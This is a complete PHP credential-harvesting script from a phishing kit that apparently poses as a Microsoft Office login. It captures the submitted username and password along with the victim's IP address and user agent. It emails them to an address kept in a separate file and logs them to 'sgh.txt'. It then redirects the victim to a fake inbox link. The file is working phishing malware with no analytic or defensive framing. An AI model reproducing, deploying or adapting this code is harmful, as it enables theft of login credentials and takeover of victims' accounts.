<?php
$UserName = $_POST['off8900'];

if($_POST["off8900"] != "" and $_POST["offpa738"] != ""){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "--------------OFFiC3 Info-----------------------\n";
$message .= "|user : ".$_POST['off8900']."\n";
$message .= "|pass: ".$_POST['offpa738']."\n";

$message .= "|--------------- DC -------------------|\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "|----------- DC --------------|\n";
include 'fill.php';
$subject = "Result from OFFiC3| ".$ip."\n";
 mail(','.$form,$subject,$message);
    $text = fopen('sgh.txt', 'a');
fwrite($text, $message);
mail($to,$subject,$message);
 
header('Location: next1.php?l=_Uiftyw_BhjodHHDKtoGYDw1774256418&fid.123InboxLight.aspxn.1774256418&fid.1252899645289964213InboxLight_Product-sml&sml='.$UserName);
}else{
header ("Location: index.php");
}

?>

 
 